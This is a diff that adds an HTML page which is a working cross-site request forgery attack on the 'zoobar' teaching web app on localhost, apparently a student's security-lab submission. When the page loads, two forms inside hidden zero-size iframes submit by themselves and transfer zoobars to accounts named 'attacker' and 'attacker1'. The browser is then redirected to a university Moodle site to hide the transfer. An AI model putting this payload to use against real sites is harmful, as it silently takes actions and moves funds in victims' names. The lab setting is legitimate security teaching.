@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<form method="POST" name="transferform1" action="http://localhost:8080/zoobar/index.cgi/transfer" id="form1" target="iframe1">
+<input name="zoobars"  type="text" value="1">
+<input name="recipient" type="text" value="attacker">
+<input type="submit" name="submission" value="Send">
+</form>
+<form method="POST" name="transferform2" action="http://localhost:8080/zoobar/index.cgi/transfer" id="form2" target="iframe2">
+<input name="zoobars"  type="text" value="9">
+<input name="recipient" type="text" value="attacker1">
+<input type="submit" name="submission" value="Send">
+</form>
+<iframe  id="iframe1" style="width:0;height:0;border:0; border:none;"></iframe>>
+<iframe  id="iframe2" style="width:0;height:0;border:0; border:none;"></iframe>>
+ <script>
+        document.getElementById('iframe1').onload = function () {
+            parent.location.href = "http://moodle.cse.iitk.ac.in";
+        }
+        document.getElementById('form1').submit();
+        document.getElementById('iframe2').onload = function () {
+            parent.location.href = "http://moodle.cse.iitk.ac.in";
+        }
+        document.getElementById('form2').submit();
+    </script>
+</body>
+</html>
